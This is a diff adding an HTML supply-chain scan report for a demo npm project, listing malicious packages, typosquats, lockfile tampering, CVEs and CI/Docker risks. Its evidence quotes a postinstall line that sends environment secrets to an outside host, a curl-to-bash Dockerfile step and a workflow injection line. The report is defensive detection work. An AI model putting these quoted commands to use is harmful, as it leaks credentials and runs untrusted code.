@@ -1,0 +1,496 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>Guardian report — shop-api@1.4.0</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+body{font:14px/1.45 system-ui,-apple-system,Segoe UI,Roboto,sans-serif;margin:0;color:#1f2328;background:#f6f7f9}
+header{background:#0f2537;color:#fff;padding:18px 28px} header h1{margin:0;font-size:20px} header p{margin:4px 0 0;opacity:.8}
+main{padding:20px 28px;max-width:1300px} h2{font-size:16px;margin:26px 0 10px}
+.cards{display:flex;gap:10px;flex-wrap:wrap} .card{background:#fff;padding:10px 16px;border-radius:6px;min-width:90px;box-shadow:0 1px 2px #0001}
+.card .n{font-size:22px;font-weight:600} .grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.grid3>div{background:#fff;padding:8px 14px;border-radius:6px} table{width:100%;border-collapse:collapse;background:#fff}
+td,th{padding:8px 10px;border-bottom:1px solid #e6e8eb;vertical-align:top;text-align:left}
+.sev{color:#fff;border-radius:4px;padding:2px 7px;font-size:12px;text-transform:uppercase} summary{cursor:pointer;font-weight:500}
+.meta{color:#57606a;font-size:12px} .src{color:#57606a;font-family:ui-monospace,monospace;font-size:12px}
+.filters{display:flex;gap:10px;margin:8px 0} select,input{padding:5px 8px;border:1px solid #ccd;border-radius:4px}
+ul{margin:4px 0 8px;padding-left:20px} small{color:#57606a}
+</style></head><body>
+<header><h1>Software Supply Chain Guardian — Discover &amp; Detect</h1>
+<p>shop-api@1.4.0 · generated 2026-11-23T09:47:00Z · vulnerability data: registry.npmjs.org advisories (GitHub Advisory DB)</p></header>
+<main>
+<h2>What is in the application</h2>
+<div class="cards"><div class="card"><div class="n">157</div><div>components</div></div>
+<div class="card"><div class="n">14</div><div>direct</div></div>
+<div class="card"><div class="n">143</div><div>transitive</div></div>
+<div class="card"><div class="n">6</div><div>max depth</div></div>
+<div class="card"><div class="n">211</div><div>edges</div></div></div>
+<p><b>Ecosystems:</b> npm: 152, docker: 2, github-actions: 3<br><b>Scopes:</b> dev: 81, prod: 72, build: 1, ci: 3<br><b>Inputs:</b> package.json, package-lock.json, Dockerfile, .github/workflows/ci.yml</p>
+<h2>What changed (vs demo/baseline/package-lock.json)</h2><div class="grid3">
+<div><h3>Added (4)</h3><ul><li>flatmap-stream@0.1.1</li><li>crossenv@6.1.1</li><li>debug-helper-utils@1.0.2</li><li>ua-parser-js@0.7.29</li></ul></div>
+<div><h3>Removed (0)</h3><ul><li>none</li></ul></div>
+<div><h3>Version changed (1)</h3><ul><li>event-stream: 3.3.4 -&gt; 3.3.6</li></ul></div></div>
+<h2>What appears risky (75 findings)</h2>
+<div class="cards"><div class="card" style="border-top:4px solid #b3261e"><div class="n">10</div><div>critical</div></div><div class="card" style="border-top:4px solid #d9480f"><div class="n">31</div><div>high</div></div><div class="card" style="border-top:4px solid #c08b00"><div class="n">18</div><div>medium</div></div><div class="card" style="border-top:4px solid #3b6fb6"><div class="n">12</div><div>low</div></div><div class="card" style="border-top:4px solid #6b7280"><div class="n">4</div><div>info</div></div></div>
+<div class="filters"><select id="sev"><option value="">all severities</option>
+<option>critical</option><option>high</option><option>medium</option><option>low</option><option>info</option></select>
+<select id="cat"><option value="">all categories</option><option value="cicd">cicd (4)</option><option value="install-script">install-script (3)</option><option value="integrity">integrity (8)</option><option value="malicious-package">malicious-package (4)</option><option value="typosquat">typosquat (1)</option><option value="unexpected-dependency">unexpected-dependency (7)</option><option value="untrusted-image">untrusted-image (4)</option><option value="vulnerability">vulnerability (44)</option></select>
+<input id="q" placeholder="search…" size="30"><label><input type="checkbox" id="hideinfo" checked> hide info</label></div>
+<table><thead><tr><th>Severity</th><th>Category</th><th>Finding (click for evidence)</th><th>Component</th></tr></thead>
+<tbody><tr class="f" data-sev="critical" data-cat="install-script">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>install-script</td><td><details><summary>Suspicious install script in crossenv@6.1.1</summary>
+<p class="meta">GRD-d59b7c1df8 · rule INSTALL-SCRIPT · heuristic evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; crossenv@6.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/crossenv]</span> hasInstallScript: true</li><li><b>script</b> <span class="src">[node_modules/crossenv/package.json]</span> postinstall: node -e &quot;require(&#x27;http&#x27;).request({host:&#x27;npm.hacktask.net&#x27;,path:&#x27;/log/?&#x27;+Buffer.from(JSON.stringify(process.env)).toString(&#x27;base64&#x27;)}).end()&quot;</li><li><b>pattern</b> <span class="src">[guardian rules]</span> executes inline / dynamically constructed code</li><li><b>pattern</b> <span class="src">[guardian rules]</span> decodes base64 payload</li><li><b>pattern</b> <span class="src">[guardian rules]</span> reads environment variables / secrets</li><li><b>pattern</b> <span class="src">[guardian rules]</span> reads environment/credentials AND sends data over the network (exfiltration pattern)</li></ul><p><b>Fix info:</b> install with --ignore-scripts and allowlist required builds; pin version</p></details></td>
+<td>crossenv@6.1.1<br><small>direct dev</small></td></tr><tr class="f" data-sev="critical" data-cat="integrity">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>integrity</td><td><details><summary>Integrity hash changed for unchanged version lodash@4.17.15</summary>
+<p class="meta">GRD-704d795f51 · rule CHANGE-INTEGRITY · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; lodash@4.17.15</li></ul><p><b>Evidence:</b></p><ul><li><b>sbom-diff</b> <span class="src">[demo/baseline/package-lock.json]</span> baseline integrity: sha512-8xOcRHvCjnocdS5cpwXQXVzmmh5e5+saE2QGoeQmb...</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/lodash]</span> current integrity: sha512-WJAEnrj+gB2oUrTvMs/hGDhnO9wWZDAUwbYwgNb3E...</li></ul><p><b>Fix info:</b> same version must always have the same bytes: treat as tampering, restore baseline lockfile</p></details></td>
+<td>lodash@4.17.15<br><small>direct prod</small></td></tr><tr class="f" data-sev="critical" data-cat="integrity">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>integrity</td><td><details><summary>Lockfile hash for lodash@4.17.15 does not match the registry</summary>
+<p class="meta">GRD-21c00fec6e · rule INTEGRITY-REGISTRY-MISMATCH · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; lodash@4.17.15</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/lodash]</span> integrity: sha512-WJAEnrj+gB2oUrTvMs/hGDhnO9wWZDAUw...</li><li><b>registry</b> <span class="src">[registry.npmjs.org]</span> dist.integrity: sha512-8xOcRHvCjnocdS5cpwXQXVzmmh5e5+saE...</li></ul><p><b>Fix info:</b> treat as tampering: do not install; restore lockfile from trusted commit</p></details></td>
+<td>lodash@4.17.15<br><small>direct prod</small></td></tr><tr class="f" data-sev="critical" data-cat="malicious-package">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>malicious-package</td><td><details><summary>Known malicious package in flatmap-stream@0.1.1: Malicious Package in flatmap-stream</summary>
+<p class="meta">GRD-613706260e · rule MAL-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-9x64-5r7x-2q53" target="_blank">GHSA-9x64-5r7x-2q53</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; event-stream@3.3.6 &rarr; flatmap-stream@0.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-9x64-5r7x-2q53: Malicious Package in flatmap-stream</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/flatmap-stream]</span> installed flatmap-stream@0.1.1 is inside affected range =0.1.1</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> no fixed version published · introduced via: event-stream@3.3.6</p></details></td>
+<td>flatmap-stream@0.1.1<br><small>transitive prod</small></td></tr><tr class="f" data-sev="critical" data-cat="malicious-package">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>malicious-package</td><td><details><summary>Known malicious package in ua-parser-js@0.7.29: Embedded malware in ua-parser-js</summary>
+<p class="meta">GRD-98f61e9402 · rule MAL-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-pjwm-rvh2-c87w" target="_blank">GHSA-pjwm-rvh2-c87w</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-pjwm-rvh2-c87w: Embedded malware in ua-parser-js</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/ua-parser-js]</span> installed ua-parser-js@0.7.29 is inside affected range =0.7.29</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 8.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 0.7.30</p></details></td>
+<td>ua-parser-js@0.7.29<br><small>transitive prod</small></td></tr><tr class="f" data-sev="critical" data-cat="malicious-package">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>malicious-package</td><td><details><summary>crossenv was taken down by npm security (malicious package)</summary>
+<p class="meta">GRD-ae3966a225 · rule REGISTRY-SECURITY-HOLDER · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; crossenv@6.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>registry</b> <span class="src">[registry.npmjs.org]</span> npm replaced this package with a security holding placeholder (latest = 0.0.2-security); this happens when a package is removed for malicious code</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/crossenv]</span> installed version 6.1.1</li></ul><p><b>Fix info:</b> remove immediately; rotate any secrets present on machines that installed it</p></details></td>
+<td>crossenv@6.1.1<br><small>direct dev</small></td></tr><tr class="f" data-sev="critical" data-cat="malicious-package">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>malicious-package</td><td><details><summary>flatmap-stream was taken down by npm security (malicious package)</summary>
+<p class="meta">GRD-ca39c1eed2 · rule REGISTRY-SECURITY-HOLDER · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; event-stream@3.3.6 &rarr; flatmap-stream@0.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>registry</b> <span class="src">[registry.npmjs.org]</span> npm replaced this package with a security holding placeholder (latest = 0.0.1-security); this happens when a package is removed for malicious code</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/flatmap-stream]</span> installed version 0.1.1</li></ul><p><b>Fix info:</b> remove immediately; rotate any secrets present on machines that installed it</p></details></td>
+<td>flatmap-stream@0.1.1<br><small>transitive prod</small></td></tr><tr class="f" data-sev="critical" data-cat="vulnerability">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in event-stream@3.3.6: Critical severity vulnerability that affects event-stream and flatmap-stream</summary>
+<p class="meta">GRD-0ed05bf1fe · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-mh6f-8j2x-4483" target="_blank">GHSA-mh6f-8j2x-4483</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; event-stream@3.3.6</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-mh6f-8j2x-4483: Critical severity vulnerability that affects event-stream and flatmap-stream</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/event-stream]</span> installed event-stream@3.3.6 is inside affected range =3.3.6</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 4.0.0 · introduced via: event-stream@3.3.6</p></details></td>
+<td>event-stream@3.3.6<br><small>direct prod</small></td></tr><tr class="f" data-sev="critical" data-cat="vulnerability">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in flatmap-stream@0.1.1: Critical severity vulnerability that affects event-stream and flatmap-stream</summary>
+<p class="meta">GRD-73005cb429 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-mh6f-8j2x-4483" target="_blank">GHSA-mh6f-8j2x-4483</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; event-stream@3.3.6 &rarr; flatmap-stream@0.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-mh6f-8j2x-4483: Critical severity vulnerability that affects event-stream and flatmap-stream</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/flatmap-stream]</span> installed flatmap-stream@0.1.1 is inside affected range &gt;=0</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> no fixed version published · introduced via: event-stream@3.3.6</p></details></td>
+<td>flatmap-stream@0.1.1<br><small>transitive prod</small></td></tr><tr class="f" data-sev="critical" data-cat="vulnerability">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in minimist@1.2.5: Prototype Pollution in minimist</summary>
+<p class="meta">GRD-2dd08017e5 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-xvch-5gv4-984h" target="_blank">GHSA-xvch-5gv4-984h</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; minimist@1.2.5</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-xvch-5gv4-984h: Prototype Pollution in minimist</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/minimist]</span> installed minimist@1.2.5 is inside affected range &gt;=1.0.0 &lt;1.2.6</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 1.2.6 · introduced via: minimist@1.2.5</p></details></td>
+<td>minimist@1.2.5<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="cicd">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>cicd</td><td><details><summary>GitHub Action quick-actions/npm-cache: branch/unversioned ref &#x27;main&#x27; (code changes on every run)</summary>
+<p class="meta">GRD-04410445f6 · rule CICD-UNPINNED-ACTION · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>workflow-line</b> <span class="src">[.github/workflows/ci.yml:.github/workflows/ci.yml:13]</span> uses: quick-actions/npm-cache@main</li></ul><p><b>Fix info:</b> pin to a full commit SHA: uses: quick-actions/npm-cache@&lt;40-char-sha&gt; # main</p></details></td>
+<td>quick-actions/npm-cache@main<br><small>direct ci</small></td></tr><tr class="f" data-sev="high" data-cat="cicd">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>cicd</td><td><details><summary>Untrusted event data interpolated into a workflow step</summary>
+<p class="meta">GRD-86639082f3 · rule CICD-SCRIPT-INJECTION · heuristic evidence · confidence medium
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>workflow-line</b> <span class="src">[.github/workflows/ci.yml:15]</span> - run: echo &quot;Triaging ${{ github.event.issue.title }}&quot;</li></ul><p><b>Fix info:</b> pass the value via env: and reference it as &quot;$VAR&quot;</p></details></td>
+<td>—<br><small> </small></td></tr><tr class="f" data-sev="high" data-cat="integrity">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>integrity</td><td><details><summary>Download source for minimist@1.2.5 changed: registry.npmjs.org -&gt; registry.npmjs-cdn.com</summary>
+<p class="meta">GRD-cbacc02b07 · rule CHANGE-SOURCE · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; minimist@1.2.5</li></ul><p><b>Evidence:</b></p><ul><li><b>sbom-diff</b> <span class="src">[demo/baseline/package-lock.json]</span> baseline resolved: https://registry.npmjs.org/minimist/-/minimist-1.2.5.tgz</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/minimist]</span> current resolved: http://registry.npmjs-cdn.com/minimist/-/minimist-1.2.5.tgz</li></ul></details></td>
+<td>minimist@1.2.5<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="integrity">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>integrity</td><td><details><summary>event-stream@3.3.6 is not published on the registry (unpublished or fabricated version)</summary>
+<p class="meta">GRD-0bb2f898bb · rule REGISTRY-VERSION-MISSING · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; event-stream@3.3.6</li></ul><p><b>Evidence:</b></p><ul><li><b>registry</b> <span class="src">[registry.npmjs.org]</span> version 3.3.6 absent from packument</li></ul></details></td>
+<td>event-stream@3.3.6<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="integrity">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>integrity</td><td><details><summary>minimist@1.2.5 is fetched over plain HTTP</summary>
+<p class="meta">GRD-dfc22d0f2f · rule INTEGRITY-INSECURE-URL · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; minimist@1.2.5</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/minimist]</span> resolved: http://registry.npmjs-cdn.com/minimist/-/minimist-1.2.5.tgz</li></ul></details></td>
+<td>minimist@1.2.5<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="integrity">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>integrity</td><td><details><summary>ua-parser-js@0.7.29 is not published on the registry (unpublished or fabricated version)</summary>
+<p class="meta">GRD-d91accc1c1 · rule REGISTRY-VERSION-MISSING · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>registry</b> <span class="src">[registry.npmjs.org]</span> version 0.7.29 absent from packument</li></ul></details></td>
+<td>ua-parser-js@0.7.29<br><small>transitive prod</small></td></tr><tr class="f" data-sev="high" data-cat="typosquat">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>typosquat</td><td><details><summary>Possible typosquat: &#x27;crossenv&#x27; looks like &#x27;cross-env&#x27;</summary>
+<p class="meta">GRD-d2c4aa3ad1 · rule TYPOSQUAT · heuristic evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; crossenv@6.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>name-similarity</b> <span class="src">[guardian popular-package list:node_modules/crossenv]</span> &#x27;crossenv&#x27; resembles popular package &#x27;cross-env&#x27; (same name after separator/homoglyph normalisation)</li><li><b>context</b> <span class="src">[inventory]</span> the legitimate &#x27;cross-env&#x27; is also in this dependency tree</li><li><b>install-script</b> <span class="src">[package-lock.json]</span> package runs an install-time script (hasInstallScript)</li><li><b>registry-metadata</b> <span class="src">[registry.npmjs.org]</span> npm replaced this package with a security holding placeholder (latest = 0.0.2-security); this happens when a package is removed for malicious code</li></ul><p><b>Fix info:</b> verify intent; if &#x27;cross-env&#x27; was meant, replace &#x27;crossenv&#x27; with &#x27;cross-env&#x27;</p></details></td>
+<td>crossenv@6.1.1<br><small>direct dev</small></td></tr><tr class="f" data-sev="high" data-cat="unexpected-dependency">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>unexpected-dependency</td><td><details><summary>Lockfile root declares &#x27;debug-helper-utils&#x27; which is not in package.json</summary>
+<p class="meta">GRD-46055a5e2c · rule UNEXPECTED-LOCK-ONLY-DEP · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; debug-helper-utils@1.0.2</li></ul><p><b>Evidence:</b></p><ul><li><b>manifest-diff</b> <span class="src">[package-lock.json:packages[&quot;&quot;]]</span> packages[&quot;&quot;] requires debug-helper-utils@1.0.2</li><li><b>manifest-diff</b> <span class="src">[package.json]</span> &#x27;debug-helper-utils&#x27; absent from all dependency sections</li></ul><p><b>Fix info:</b> lockfile was edited outside npm or is out of sync; regenerate and review the diff</p></details></td>
+<td>debug-helper-utils@1.0.2<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="untrusted-image">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>untrusted-image</td><td><details><summary>Dockerfile: RUN pipes a downloaded script into a shell</summary>
+<p class="meta">GRD-09f992c3b6 · rule IMAGE-PIPE-TO-SHELL · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>dockerfile-line</b> <span class="src">[Dockerfile:4]</span> RUN curl -fsSL https://get.example-tools.io/setup.sh | bash</li></ul></details></td>
+<td>—<br><small> </small></td></tr><tr class="f" data-sev="high" data-cat="untrusted-image">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>untrusted-image</td><td><details><summary>Image &#x27;fastbuilds/node-runtime&#x27; comes from a non-allowlisted publisher (docker.io)</summary>
+<p class="meta">GRD-a0dfadd0ab · rule IMAGE-UNTRUSTED-SOURCE · verified evidence · confidence medium
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>image-reference</b> <span class="src">[Dockerfile:Dockerfile:8]</span> image: fastbuilds/node-runtime:18</li><li><b>policy</b> <span class="src">[guardian policy]</span> not a Docker Official Image and not under trusted prefixes: gcr.io/distroless/, mcr.microsoft.com/, cgr.dev/chainguard/, registry.access.redhat.com/...</li></ul><p><b>Fix info:</b> use an official / verified-publisher image or add the publisher to the allowlist after review</p></details></td>
+<td>fastbuilds/node-runtime@18<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in body-parser@1.19.0: body-parser vulnerable to Denial of Service via trailing bytes after a compressed request body</summary>
+<p class="meta">GRD-b38171a52f · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-27r3-jxmh-p828" target="_blank">GHSA-27r3-jxmh-p828</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-27r3-jxmh-p828: body-parser vulnerable to Denial of Service via trailing bytes after a compressed request body</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/body-parser]</span> installed body-parser@1.19.0 is inside affected range &lt;1.20.9</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 1.20.9 · introduced via: express@4.17.1</p></details></td>
+<td>body-parser@1.19.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in body-parser@1.19.0: body-parser vulnerable to denial of service when url encoding is enabled</summary>
+<p class="meta">GRD-7c9e777fa6 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-qwcr-r2fm-qrc7" target="_blank">GHSA-qwcr-r2fm-qrc7</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-qwcr-r2fm-qrc7: body-parser vulnerable to denial of service when url encoding is enabled</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/body-parser]</span> installed body-parser@1.19.0 is inside affected range &lt;1.20.3</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 1.20.3 · introduced via: express@4.17.1</p></details></td>
+<td>body-parser@1.19.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in js-yaml@4.0.0: JS-YAML: Quadratic CPU consumption in !!omap resolution (3.x and 4.x) — CVE-2026-59870 fix not backported</summary>
+<p class="meta">GRD-46855e70de · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-5p4m-2wfm-xmqj" target="_blank">GHSA-5p4m-2wfm-xmqj</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; js-yaml@4.0.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-5p4m-2wfm-xmqj: JS-YAML: Quadratic CPU consumption in !!omap resolution (3.x and 4.x) — CVE-2026-59870 fix not backported</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/js-yaml]</span> installed js-yaml@4.0.0 is inside affected range &gt;=4.0.0 &lt;4.3.1</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 4.3.1 · introduced via: mocha@8.4.0</p></details></td>
+<td>js-yaml@4.0.0<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in js-yaml@4.0.0: js-yaml: YAML merge-key chains can force quadratic CPU consumption</summary>
+<p class="meta">GRD-e7a20cd82a · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-52cp-r559-cp3m" target="_blank">GHSA-52cp-r559-cp3m</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; js-yaml@4.0.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-52cp-r559-cp3m: js-yaml: YAML merge-key chains can force quadratic CPU consumption</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/js-yaml]</span> installed js-yaml@4.0.0 is inside affected range &gt;=4.0.0 &lt;4.3.0</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 4.3.0 · introduced via: mocha@8.4.0</p></details></td>
+<td>js-yaml@4.0.0<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in js-yaml@4.0.0: js-yaml: maxTotalMergeKeys does not limit CPU use for empty merge sources</summary>
+<p class="meta">GRD-745c229a21 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-2883-xcg3-v3hh" target="_blank">GHSA-2883-xcg3-v3hh</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; js-yaml@4.0.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-2883-xcg3-v3hh: js-yaml: maxTotalMergeKeys does not limit CPU use for empty merge sources</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/js-yaml]</span> installed js-yaml@4.0.0 is inside affected range &gt;=4.0.0 &lt;4.3.2</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 4.3.2 · introduced via: mocha@8.4.0</p></details></td>
+<td>js-yaml@4.0.0<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
